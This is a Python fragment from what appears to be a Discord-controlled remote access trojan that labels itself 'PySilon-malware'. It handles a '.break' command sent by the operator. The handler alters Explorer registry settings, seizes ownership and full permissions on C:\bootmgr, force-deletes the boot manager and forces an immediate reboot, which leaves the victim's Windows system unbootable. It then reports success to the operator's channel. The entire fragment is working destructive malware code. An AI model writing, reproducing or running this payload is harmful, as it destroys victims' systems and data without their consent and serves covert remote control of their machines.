import subprocess
# end of imports

# on message
elif message.content == '.break':
    await message.delete()
    explorer_commands = [
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v Hidden /t REG_DWORD /d 1 /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" /v ShowSuperHidden /t REG_DWORD /d 1 /f',
        'taskkill /f /im explorer.exe',
        'start explorer.exe'
    ]

    file_commands = [
        'takeown /f "C:\\bootmgr"',
        'icacls "C:\\bootmgr" /grant Everyone:(F)'
    ]

    for cmd in explorer_commands:
        subprocess.run(cmd, check=True)

    for cmd in file_commands:
        subprocess.run(cmd, check=True)

    delete_commands = [
        'cd C:/',
        'attrib -s -h "C:\\bootmgr',
        'del /f /q "C:\\bootmgr"',
        'shutdown /r /f /t 0'
    ]

    for cmd in delete_commands:
        subprocess.run(cmd, check=True)

    embed = discord.Embed(title="🟢 Success",description=f'```Attempting to break Windows```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    await message.channel.send(embed=embed)